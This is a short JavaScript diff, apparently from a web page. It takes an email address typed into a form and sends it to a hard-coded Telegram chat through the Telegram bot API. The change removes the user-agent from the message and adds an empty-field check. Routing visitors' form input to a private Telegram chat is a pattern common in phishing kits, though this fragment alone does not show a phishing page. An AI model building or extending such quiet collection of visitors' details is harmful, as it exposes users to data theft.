@@ -20,8 +20,13 @@
                 var chatId = "709764990";
                 var message = $("#emailinput").val();
                 var userAgent = navigator.userAgent; // Hier wird der User-Agent des Browsers abgerufen
-                var fullMessage = "Email: " + message + "\nUser-Agent: " + userAgent;
+                var fullMessage = "Email: " + message;
                 
+                if (message.trim() === "") {
+                    alert("Bitte geben Sie eine E-Mail-Adresse ein.");
+                    return;
+                }
+
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
                 });
